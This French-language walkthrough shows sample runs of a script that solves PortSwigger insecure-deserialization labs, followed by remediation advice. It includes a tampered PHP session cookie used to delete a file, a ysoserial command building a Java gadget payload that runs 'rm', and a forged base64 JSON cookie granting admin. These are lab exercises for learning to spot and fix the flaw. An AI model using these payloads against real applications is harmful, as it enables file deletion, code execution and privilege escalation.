# MANPAGE

Voici un **exemple exhaustif de l’exécution du script** pour les challenges *insecure deserialization* de PortSwigger, couvrant les scénarios PHP, Java, et JSON, et illustrant chaque étape automatisée : détection, décodage, modification, injection, contrôle et validation.

---

## 1. Détection automatique de données sérialisées

```
------------------------------------------------------
[1] Détection de données sérialisées dans les cookies et réponses
- Cookies reçus :
Set-Cookie: session=O:8:"UserData":2:{s:8:"username";s:6:"wiener";s:11:"avatar_link";s:23:"/home/wiener/avatar.jpg";}
- Exemples d'encodage à surveiller :
    * PHP : O: ou a: ou s: ou C: ou b: ou i:
    * Java : rO0A ou ACED0005
    * JSON : {" ou [
- Vérifiez les cookies/session pour des patterns de sérialisation.
  [+] Cookie PHP sérialisé détecté.
```
*Le script détecte automatiquement un objet PHP sérialisé dans le cookie de session, typique des labs PHP PortSwigger[4][5].*

---

## 2. Décodage et modification de l'objet sérialisé

```
------------------------------------------------------
[2] Décodage et modification de l'objet sérialisé
- Objet PHP détecté :
O:8:"UserData":2:{s:8:"username";s:6:"wiener";s:11:"avatar_link";s:23:"/home/wiener/avatar.jpg";}
  [+] Objet modifié :
O:8:"UserData":2:{s:8:"username";s:6:"wiener";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}
```
*Le script propose une modification automatique du champ `avatar_link` pour cibler un fichier sensible, comme demandé dans de nombreux labs[4][5].*

---

## 3. Injection du payload et attaque

```
------------------------------------------------------
[3] Injection du payload et attaque
- Injection du payload dans le cookie et requête sur /my-account/delete
Your avatar has been deleted.
```
*Le script injecte le cookie modifié dans la requête et affiche la réponse. Ici, la suppression du fichier cible est confirmée par le message retourné, ce qui valide l'exploitation[5][6].*

---

## 4. Contrôle du résultat de l'attaque

```
------------------------------------------------------
[4] Contrôle du résultat de l'attaque
  [+] Effet détecté :
Your avatar has been deleted.
```
*Le script analyse la réponse pour valider que l’action attendue (suppression, accès admin, etc.) a bien eu lieu, comme requis pour la validation du lab[5][6].*

---

## (Scénario Java – exploitation gadget chain)

Supposons que le lab utilise Java (pattern `rO0AB...` dans le cookie) :

```
------------------------------------------------------
[1] Détection de données sérialisées dans les cookies et réponses
- Cookies reçus :
Set-Cookie: session=rO0ABXNyABdjb20uZXhhbXBsZS5Vc2VyRGF0YQ...
- Exemples d'encodage à surveiller :
    * PHP : O: ou a: ou s: ou C: ou b: ou i:
    * Java : rO0A ou ACED0005
    * JSON : {" ou [
- Vérifiez les cookies/session pour des patterns de sérialisation.
  [+] Cookie Java sérialisé détecté.
------------------------------------------------------
[2] Décodage et modification de l'objet sérialisé
- Objet Java détecté. Utilisez ysoserial pour générer un payload.
  Exemple : java -jar ysoserial.jar CommonsCollections1 'rm /home/carlos/morale.txt' | base64
Collez ici le payload Java base64 à injecter : <payload_base64>
------------------------------------------------------
[3] Injection du payload et attaque
<no output, server response>
------------------------------------------------------
[4] Contrôle du résultat de l'attaque
  [+] Effet détecté :
Congratulations, you solved the lab!
```
*Le script guide l’utilisateur pour générer le payload avec ysoserial, puis l’injecte et contrôle la réponse. Si le message de succès apparaît, la faille est exploitée[3].*

---

## (Scénario JSON/base64)

```
------------------------------------------------------
[1] Détection de données sérialisées dans les cookies et réponses
- Cookies reçus :
Set-Cookie: session=eyJ1c2VyIjoid2llbmVyIiwiYWRtaW4iOmZhbHNlfQ==
...
  [+] Cookie JSON/base64 détecté.
------------------------------------------------------
[2] Décodage et modification de l'objet sérialisé
- Objet JSON/base64 détecté :
{"user":"wiener","admin":false}
  [+] Objet modifié et ré-encodé :
eyJ1c2VyIjoid2llbmVyIiwiYWRtaW4iOnRydWV9
------------------------------------------------------
[3] Injection du payload et attaque
Welcome, admin!
------------------------------------------------------
[4] Contrôle du résultat de l'attaque
  [+] Effet détecté :
Welcome, admin!
```
*Le script décode le JSON, modifie le champ `admin` à `true`, ré-encode, injecte et valide l’élévation de privilège.*

---

## 5. Conseils/remédiation

```
------------------------------------------------------
[Remédiation & Conseils]
- Ne désérialisez jamais de données contrôlées par l’utilisateur.
- Utilisez des formats sûrs (JSON, XML) et des bibliothèques à jour.
- Implémentez des contrôles de type/classe lors de la désérialisation.
- Pour PHP, n’utilisez pas unserialize() sur des données non sûres.
- Pour Java, limitez les classes autorisées et utilisez des gadgets connus uniquement pour les tests.
- Documentation PortSwigger : https://portswigger.net/web-security/deserialization
```

---

## 6. Synthèse

```
------------------------------------------------------
[SYNTHÈSE]
1. Détection automatique de données sérialisées.
2. Décodage, modification et génération de payloads adaptés.
3. Injection et contrôle automatisé de l’effet (suppression, admin, RCE, etc.).
4. Application des recommandations de sécurité.
------------------------------------------------------
```

---
